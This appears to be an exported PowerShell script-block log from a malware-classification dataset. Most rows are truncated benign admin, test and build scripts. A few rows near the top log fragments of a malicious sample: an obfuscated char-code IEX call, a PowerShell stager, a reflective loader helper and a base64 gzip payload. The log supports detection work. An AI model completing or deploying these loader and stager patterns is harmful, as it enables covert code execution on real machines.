"8/6/2026 9:30:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1012.ps1","8082",". ( $PsHoMe[21]+$pshoMe[30]+'x')([STRinG]::JoiN( '' ,( '105w102d40m91}73w110I116d80z116m114m93m58d58w83I105Q122}101w32}45I101s113t32d52}41s123t36w98z61t39h112I111m119}101t114t115w104I101}108w108s46m10"
"8/6/2026 9:30:52 AM","","9","$global:?"
"8/6/2026 9:30:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:30:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:30:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:30:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:30:52 AM","","80","{ $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }"
"8/6/2026 9:30:52 AM","","538","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:30:52 AM","","2658","function bmWfO_E4Z7u {
	Param ($krMZLsRKkt, $lKeNmt1Sg)		
	$zC4YuBcqP6 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('"
"8/6/2026 9:30:51 AM","","1960","$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAGyLVgCA71W227bOBB9ToH+g1AYkIQ6lp24SRugwFKWb/EldhTLtzUCRqJkxpToSJRv3f77jmypcZFkt9uHFRKY1MyQh2fODOXGgS0oD6QHf+je3FfLk8tY+vb+3UkPh9iXlNwi"
"8/6/2026 9:30:50 AM","","9","$global:?"
"8/6/2026 9:30:49 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1012.ps1","2326","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop "
"8/6/2026 9:30:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:30:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:30:42 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:30:42 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:30:41 AM","C:\TA\project-ta\data_spliting\test_set\benign\435.ps1","6613","; Register-PSFTeppArgumentCompleter -Command Export-PSFConfig -Parameter FullName -Name 'PSFramework-config-fullname'; Register-PSFTeppArgumentCompleter -Command Export-PSFConfig -Parameter Module -Na"
"8/6/2026 9:30:34 AM","","9","$global:?"
"8/6/2026 9:30:34 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:30:34 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:30:34 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:30:34 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:30:34 AM","C:\TA\project-ta\data_spliting\test_set\benign\433.ps1","350","Register-PSFTeppScriptblock -Name ""PSFramework-config-name"" -ScriptBlock {; $moduleName = ""*""; if ($fakeBoundParameter.Module) { $moduleName = $fakeBoundParameter.Module }; [PSFramework.Configuration."
"8/6/2026 9:30:26 AM","","9","$global:?"
"8/6/2026 9:30:26 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:30:26 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:30:26 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:30:26 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:30:26 AM","C:\TA\project-ta\data_spliting\test_set\benign\424.ps1","226","Register-PSFTeppScriptblock -Name ""PSFramework-config-fullname"" -ScriptBlock {; [PSFramework.Configuration.ConfigurationHost]::Configurations.Values | Where-Object { -not $_.Hidden } | Select-Object -"
"8/6/2026 9:30:18 AM","","9","$global:?"
"8/6/2026 9:30:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:30:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:30:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:30:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:30:18 AM","C:\TA\project-ta\data_spliting\test_set\benign\422.ps1","145","Register-PSFTeppScriptblock -Name 'PSFramework-config-validation' -ScriptBlock { [PSFramework.Configuration.ConfigurationHost]::Validation.Keys }"
"8/6/2026 9:30:10 AM","C:\TA\project-ta\data_spliting\test_set\benign\4200.ps1","503","Function EnableIEActiveXControl ($AppName,$GUID,$Flag) {; $Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\""+$GUID; If ((Test-Path $Key) -eq $true) {; Write-Host $AppName""....."
"8/6/2026 9:30:10 AM","C:\TA\project-ta\data_spliting\test_set\benign\4200.ps1","1550","Set-Variable -Name Errors -Value $null -Scope Global -Force; Set-Variable -Name LogFile -Value ""c:\windows\waller\Logs\BuildLogs\AdobeFlashPlayer.log"" -Scope Global -Force; Set-Variable -Name Relative"
"8/6/2026 9:30:02 AM","","9","$global:?"
"8/6/2026 9:30:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","167","Function WriteToScreen {; cls; Foreach ($Failure in $Global:Failures) {; If ($Failure -ne $null) {; Write-Output $Failure; }; }; $ErrorActionPreference = 'Continue'; }"
"8/6/2026 9:30:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","2945","Function ProcessComputers {; $obj = New-Object PSObject; $Count = 0; Foreach ($Computer in $Global:Computers) {; cls; $Antivirus = $false; $Count += 1; Write-Host ""Processing ""$Count"" of "" -NoNewline;"
"8/6/2026 9:30:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","537","Function ProcessLogFile {; If ((Test-Path $Global:LogFile) -eq $true) {; Remove-Item $Global:LogFile -Force; }; If ((Test-Path $Global:LogFile) -eq $false) {; $temp = New-Item $Global:LogFile -ItemTyp"
"8/6/2026 9:30:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","574","Function InitializeGlobalMemory {; Set-Variable -Name Computers -Scope Global -Force; Set-Variable -Name Logfile -Scope Global -Force; Set-Variable -Name RelativePath -Scope Global -Force; Set-Variabl"
"8/6/2026 9:30:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:30:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:30:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:30:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:30:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","4344","Function InitializeGlobalMemory {; Set-Variable -Name Computers -Scope Global -Force; Set-Variable -Name Logfile -Scope Global -Force; Set-Variable -Name RelativePath -Scope Global -Force; Set-Variabl"
"8/6/2026 9:29:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:29:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:29:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:29:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:29:54 AM","C:\TA\project-ta\data_spliting\test_set\benign\4164.ps1","2862","$Architecture = Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture; $Architecture = $Architecture.OSArchitecture; if ($Architecture -eq ""32-bit"") {; if ((Test-Path ""HKLM:\SOFTWA"
"8/6/2026 9:29:46 AM","C:\TA\project-ta\data_spliting\test_set\benign\4162.ps1","1613","$RebootThreshold = 14; $Today = Get-Date; $Architecture = Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture; $Architecture = $Architecture.OSArchitecture; $LastReboot = get-win"
"8/6/2026 9:29:38 AM","","9","$global:?"
"8/6/2026 9:29:38 AM","C:\TA\project-ta\data_spliting\test_set\benign\4124.ps1","60","{dism.exe /online /get-featureinfo /featurename:MediaCenter}"
"8/6/2026 9:29:38 AM","C:\TA\project-ta\data_spliting\test_set\benign\4124.ps1","71","{dism.exe /online /disable-feature /featurename:MediaCenter /norestart}"
"8/6/2026 9:29:38 AM","C:\TA\project-ta\data_spliting\test_set\benign\4124.ps1","2137","cls; Set-Variable -Name a -Scope Global -Force; Set-Variable -Name Output -Scope Global -Force; Function AddRemovePrograms($KeyName, $DisplayName, $Version){; New-PSDrive -Name HKCR -PSProvider Regist"
"8/6/2026 9:29:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:29:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:29:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:29:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:29:30 AM","C:\TA\project-ta\data_spliting\test_set\benign\4112.ps1","144","Function NewLogFile {; $FileName = ""NotRebooted.log""; $Log = $Env:windir + ""\Logs""; New-Item -Path $Log -Name $FileName -ItemType File -Force; }"
"8/6/2026 9:29:30 AM","C:\TA\project-ta\data_spliting\test_set\benign\4112.ps1","822","Function DeleteLogFiles {; Set-Variable Count -Scope Local -Force; Set-Variable Files -Scope Local -Force; Set-Variable i -Scope Local -Force; $Months = @(""Jan"",""Feb"",""Mar"",""Apr"",""May"",""Jun"",""Jul"",""Au"
"8/6/2026 9:29:30 AM","C:\TA\project-ta\data_spliting\test_set\benign\4112.ps1","1145","Set-Variable -Name FileName -Scope Global -Force; Set-Variable -Name Log -Scope Global -Force; Function DeleteLogFiles {; Set-Variable Count -Scope Local -Force; Set-Variable Files -Scope Local -Force"
"8/6/2026 9:29:22 AM","C:\TA\project-ta\data_spliting\test_set\benign\4099.ps1","26","{ $_.Name -like ""*.msu*"" }"
"8/6/2026 9:29:22 AM","C:\TA\project-ta\data_spliting\test_set\benign\4099.ps1","1340","function Install-MSUUpdates {; Set-Variable -Name Arguments -Scope Local -Force; Set-Variable -Name ErrCode -Scope Local -Force; Set-Variable -Name Executable -Value $env:windir""\System32\wusa.exe"" -S"
"8/6/2026 9:29:22 AM","C:\TA\project-ta\data_spliting\test_set\benign\4099.ps1","26","{ $_.Name -like ""*.exe*"" }"
"8/6/2026 9:29:22 AM","C:\TA\project-ta\data_spliting\test_set\benign\4099.ps1","1144","function Install-EXEUpdates {; Set-Variable -Name Arguments -Scope Local -Force; Set-Variable -Name ErrCode -Scope Local -Force; Set-Variable -Name File -Scope Local -Force; Set-Variable -Name EXEFile"
"8/6/2026 9:29:22 AM","C:\TA\project-ta\data_spliting\test_set\benign\4099.ps1","2555","function Install-EXEUpdates {; Set-Variable -Name Arguments -Scope Local -Force; Set-Variable -Name ErrCode -Scope Local -Force; Set-Variable -Name File -Scope Local -Force; Set-Variable -Name EXEFile"
"8/6/2026 9:29:15 AM","","9","$global:?"
"8/6/2026 9:29:15 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:29:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:29:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:29:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:29:14 AM","C:\TA\project-ta\data_spliting\test_set\benign\4098.ps1","111","Function GetRelativePath{; $Global:RelativePath=(split-path $SCRIPT:MyInvocation.MyCommand.Path -parent)+""\""; }"
"8/6/2026 9:29:14 AM","C:\TA\project-ta\data_spliting\test_set\benign\4098.ps1","173","Function RenameWindow ($Title) {; Set-Variable -Name a -Scope Local -Force; $a = (Get-Host).UI.RawUI; $a.WindowTitle = $Title; Remove-Variable -Name a -Scope Local -Force; }"
"8/6/2026 9:29:14 AM","C:\TA\project-ta\data_spliting\test_set\benign\4098.ps1","2227","; Set-Variable -Name Command -Scope Global -Force; Set-Variable -Name Computer -Scope Global -Force; Set-Variable -Name Computers -Scope Global -Force; Set-Variable -Name i -Scope Global -Value 1 -For"
"8/6/2026 9:29:06 AM","C:\TA\project-ta\data_spliting\test_set\benign\4093.ps1","529","cls; $Printers = Get-WmiObject Win32_Printer; $EXE = $env:windir + ""\system32\printui.exe""; $PrintUI = ""/dn /n ""; Foreach ($Printer in $Printers) {; If ($Printer.ShareName -ne $null) {; Write-Host ""Un"
"8/6/2026 9:28:58 AM","C:\TA\project-ta\data_spliting\test_set\benign\4088.ps1","1049","Function CheckADForUser ($Member){; Set-Variable -Name Computer -Scope Local -Force; Set-Variable -Name Group -Scope Local -Force; Set-Variable -Name LocalGroup -Scope Local -Force; Set-Variable -Name"
"8/6/2026 9:28:58 AM","C:\TA\project-ta\data_spliting\test_set\benign\4088.ps1","3389","Set-Variable -Name Member -Scope Local -Force; Set-Variable -Name Results -Value $false -Scope Global -Force; Function AddRemovePrograms($KeyName, $DisplayName, $Version){; New-PSDrive -Name HKCR -PSP"
"8/6/2026 9:28:51 AM","","9","$global:?"
"8/6/2026 9:28:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:28:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:28:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:28:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:28:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\4087.ps1","955","; $PatchReboot = Get-ChildItem -Path REGISTRY::""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired"" -ErrorAction SilentlyContinue; $ComponentBasedReb"
"8/6/2026 9:28:43 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:28:43 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:28:43 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:28:43 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:28:43 AM","C:\TA\project-ta\data_spliting\test_set\benign\4080.ps1","540","Import-Module $env:ProgramFiles""\Microsoft Security Client\MpProvider""; Start-MProtScan -ScanType ""FullScan""; New-EventLog â€“LogName System â€“Source ""Antimalware Full Scan""; Write-EventLog -LogName "
"8/6/2026 9:28:35 AM","","9","$global:?"
"8/6/2026 9:28:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\3990.ps1","5061","function NetworkRuleSetTests {; $location = Get-Location; $resourceGroupName = getAssetName ""RSG""; $namespaceName = getAssetName ""ServiceBus-Namespace-""; $namespaceName2 = getAssetName ""ServiceBus-Nam"
"8/6/2026 9:28:28 AM","","9","$global:?"
"8/6/2026 9:28:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\3986.ps1","10113","function ServiceBusTests {; $location = Get-Location; $resourceGroupName = getAssetName ""RGName-""; $namespaceName = getAssetName ""Namespace1-""; $namespaceName2 = getAssetName ""Namespace2-""; Write-Debu"
"8/6/2026 9:28:20 AM","","97","Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","105","Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","99","Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","102","Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","99","Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","112","Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","110","Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","101","Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","103","Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","101","Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","100","Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","","100","Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:28:20 AM","C:\TA\project-ta\data_spliting\test_set\benign\375.ps1","1195","Describe ""Get-PSFConfig Unit Tests"" -Tag ""CI"", ""Config"", ""Unit"" {; BeforeAll {; Get-PSFConfig -Module PSFTests -Force | ForEach-Object {; $null = [PSFramework.Configuration.ConfigurationHost]::Configu"
"8/6/2026 9:28:12 AM","","9","$global:?"
"8/6/2026 9:28:12 AM","C:\TA\project-ta\data_spliting\test_set\benign\3499.ps1","206","if ($PSEdition -eq 'Desktop') {; try {; [Microsoft.Azure.PowerShell.Authenticators.DesktopAuthenticatorBuilder]::Apply([Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance); } catch"
"8/6/2026 9:28:05 AM","","9","$global:?"
"8/6/2026 9:28:05 AM","C:\TA\project-ta\data_spliting\test_set\benign\3100.ps1","724","$buildDir = ""$PSScriptRoot\build""; $ErrorActionPreference = 'Stop'; if (Test-Path $buildDir) {; Write-Verbose ""Removing build dir""; Remove-Item $buildDir -Recurse -Force -Confirm:$false -Verbose -Erro"
"8/6/2026 9:27:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:27:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:27:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:27:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:27:57 AM","C:\TA\project-ta\data_spliting\test_set\benign\3080.ps1","815","$global:ValidatorRoot = Split-Path $MyInvocation.MyCommand.Path; BeforeEachFeature {; New-Module -Name ValidatorTestEs {; . $global:ValidatorRoot\ValidatorEs.ps1 -Verbose; } | Import-Module -Global; }"
"8/6/2026 9:27:50 AM","","97","Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","105","Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","99","Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","102","Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","99","Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","112","Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","110","Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","101","Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","103","Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","101","Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","100","Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:50 AM","","100","Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:49 AM","C:\TA\project-ta\data_spliting\test_set\benign\3065.ps1","2653","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""Should -HaveCount"" {; It ""passes if collection has the expected amount of items"" {; @(1, 'a', 3) | Should -HaveCount 3; }; It ""passes "
"8/6/2026 9:27:41 AM","C:\TA\project-ta\data_spliting\test_set\benign\3034.ps1","1541","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""Should -Exist"" {; It ""returns true for paths that exist"" {; $TestDrive | Should Exist; $TestDrive | Should -Exist; }; It ""returns fals"
"8/6/2026 9:27:33 AM","","97","Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","105","Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","99","Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","102","Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","99","Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","112","Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","110","Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","101","Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","103","Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","101","Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","100","Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","","100","Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:27:33 AM","C:\TA\project-ta\data_spliting\test_set\benign\3027.ps1","444","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""the In statement"" {; Setup -Dir ""test_path""; It ""executes a command in that directory"" {; In ""$TestDrive"" -Execute { """" | Out-File ""te"
"8/6/2026 9:27:25 AM","","9","$global:?"
"8/6/2026 9:27:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:27:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:27:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:27:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:27:25 AM","C:\TA\project-ta\data_spliting\test_set\benign\2959.ps1","215","properties {; $my_property = $p1 + $p2; }; task default -depends TestParams; task TestParams {; Assert ($my_property -ne $null) ""`$my_property should not be null. Run with -parameters @{'p1' = 'v1'; '"
"8/6/2026 9:27:17 AM","","9","$global:?"
"8/6/2026 9:27:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:27:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:27:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:27:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:27:17 AM","C:\TA\project-ta\data_spliting\test_set\benign\2945.ps1","139","Framework '4.0x86'; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {}; else {; exec { msbuild /version }; }; }"
"8/6/2026 9:27:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:27:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:27:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:27:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:27:09 AM","C:\TA\project-ta\data_spliting\test_set\benign\2939.ps1","224","task default -depends Test; task Test -depends Compile, Clean -PreAction {""Pre-Test""} -Action {; Assert $false ""This fails.""; } -PostAction {""Post-Test""}; task Compile -depends Clean {; ""Compile""; }; "
"8/6/2026 9:27:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:27:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:27:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:27:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:27:01 AM","C:\TA\project-ta\data_spliting\test_set\benign\2923.ps1","608","task default -depends Test; task Test -depends Compile, Clean {; Assert $false ""This fails.""; }; task Compile -depends Clean {; ""Compile""; }; task Clean {; ""Clean""; }; taskTearDown {; param($task); As"
"8/6/2026 9:26:53 AM","","9","$global:?"
"8/6/2026 9:26:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:26:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:26:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:26:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:26:53 AM","C:\TA\project-ta\data_spliting\test_set\benign\2914.ps1","213","Framework ""1.1.0""; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {; $output = &dotnet build -version -nologo 2>&1; Assert ($output -NotLike ""15.1"") '$output should contai"
"8/6/2026 9:26:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:26:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:26:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:26:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:26:45 AM","C:\TA\project-ta\data_spliting\test_set\benign\2911.ps1","368","Properties {; [string]$testProperty = ""Test123""; }; BuildTearDown {; [string]$expected = ""Test123""; if ($testProperty -ne $expected) {; throw ""Expected '$expected', but was actually '$testProperty'""; "
"8/6/2026 9:26:37 AM","","9","$global:?"
"8/6/2026 9:26:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:26:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:26:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:26:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:26:37 AM","C:\TA\project-ta\data_spliting\test_set\benign\2903.ps1","247","Framework '3.5'; task default -depends AspNetCompiler; task AspNetCompiler {; if ( $IsMacOS -OR $IsLinux ) {}; else {; aspnet_compiler; if ($LastExitCode -ne 1) {; throw 'Error: Could not execute aspn"
"8/6/2026 9:26:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:26:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:26:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:26:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
